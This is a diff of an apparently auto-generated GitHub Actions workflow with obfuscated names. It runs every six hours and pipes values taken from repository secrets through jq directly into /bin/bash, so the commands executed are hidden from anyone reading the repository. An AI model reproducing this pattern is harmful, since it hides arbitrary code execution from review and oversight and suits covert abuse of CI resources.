@@ -1,25 +1,18 @@
 name: hejiuba3415
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 4/6 * * *'
-
+    - cron: '32 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: hejiuba3415
         env:
-          cn48215: ${{ secrets.cn48215 }}
+          zc1974: ${{ secrets.zc1974 }}
         run: |
-          echo $cn48215 | jq -r .vfza0957 | /bin/bash
-          echo $q2395 | jq -r .qh983 | /bin/bash
-          echo $xvjs5 | jq -r .ep1569 | /bin/bash
-          echo $kc4364 | jq -r .nzg7238 | /bin/bash
-          echo $lek2 | jq -r .cby18441 | /bin/bash
-          echo $g8527 | jq -r .gz909 | /bin/bash
-          echo $jti942 | jq -r .m34 | /bin/bash
+          echo $zc1974 | jq -r .qb1 | /bin/bash
+          echo $oejdn422 | jq -r .znyh2 | /bin/bash
+          echo $hx2 | jq -r .in2211 | /bin/bash
 
